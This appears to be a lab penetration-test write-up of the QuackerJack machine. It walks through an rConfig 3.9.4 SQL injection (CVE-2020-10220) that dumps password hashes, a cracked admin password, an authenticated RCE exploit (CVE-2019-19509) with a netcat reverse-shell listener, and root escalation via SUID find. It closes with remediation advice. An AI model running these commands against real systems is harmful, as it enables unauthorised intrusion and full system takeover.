# Report - QuackerJack

Author: Henry Post  
Target: QUACKERJACK  
Target IP: 192.168.52.67  
Date: 04/08/2026  
# Executive Summary

This machine, QuackerJack, was enumerated by `nmap` to have port `8081` open, running rConfig version `3.9.4`.

rConfig was vulnerable to two CVEs.

`CVE-2020-10220` was used to dump users and password hashes from the victim, and `CVE-2019-19509` was used to get a non-root reverse shell.

A SUID-set binary was found at `/usr/bin/find`, and this was used to pivot to a root shell.

# Recommendations

Update rConfig to the latest non-vulnerable version.

Do not set SUID bit on binaries that do not need it.

Use strong passwords for admin accounts.

# References

- https://gtfobins.org/gtfobins/find/
- https://www.exploit-db.com/exploits/47982
- https://md5.gromweb.com/?md5=dc40b85276a1f4d7cb35f154236aa1b2
- https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2020-10220.py

# Recon

`nmap -sV -sC -T4 -oA initial QUACKERJACK` shows us we have port `8081` open, serving the HTTPS service.

![](Pasted%20image%2020260408152324.png)

We notice we can access port `8081` over HTTPS.
# Non-root access

## SQL Injection

To dump the users, we use an SQL injection attack, specifically CVE-2020-10220. We need to authenticate to get remote code execution to trigger.

![](Pasted%20image%2020260408152933.png)

```bash
# to get username and password
wget https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/refs/heads/master/rconfig_CVE-2020-10220.py

# nano edit the file and add this to bypass SSL
# request.verify = False
nano rconfig_CVE-2020-10220.py

python rconfig_CVE-2020-10220.py https://QUACKERJACK:8081/

<<EOF

output:
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://QUACKERJACK:8081//commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
Maybe no more information ?
Maybe no more information ?
toljscxnuq:764:21232f297a57a5a743894a0e4a801fc3
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
[+] Extracting 10 first devices :
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Done

EOF
```

![](Pasted%20image%2020260408153002.png)

We have a password hash.

	admin:1:dc40b85276a1f4d7cb35f154236aa1b2

We crack it easily, using a site.

- https://md5.gromweb.com/?md5=dc40b85276a1f4d7cb35f154236aa1b2

Our credential is:

	admin:abgrtyu

## Remote Code Execution

We can now perform RCE.

https://www.exploit-db.com/exploits/47982, CVE-2019-19509.

This comes pre-loaded on Kali's hard drive.

```bash
cp /usr/share/exploitdb/exploits/php/webapps/47982.py ./

# get attacker IP
ip a|grep 192

# run in separate shell. we need to use port 80 here because the victim is blocked from reaching out to non-http/https port numbers.
nc -nvlp 80

# make request.verify = False
# request = requests.session()
# request.verify = False
nano 47982.py

python 47982.py https://QUACKERJACK:8081/ admin abgrtyu 192.168.49.67 80

```

![](Pasted%20image%2020260408153453.png)

![](Pasted%20image%2020260408153519.png)

We have non-root shell.
# Root access

To get root access, it is somewhat simple.

1. Find a SUID-set binary,
2. Use GTFOBins to escalate.

```sh
find / -perm -u=s -type f 2>/dev/null | grep -v snap

<<EOF
/usr/bin/find
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
EOF
```

We can pick `/usr/bin/find`.

```sh
find . -exec /bin/sh -p \; -quit
```

And just like that, we have root shell.

![](Pasted%20image%2020260408153712.png)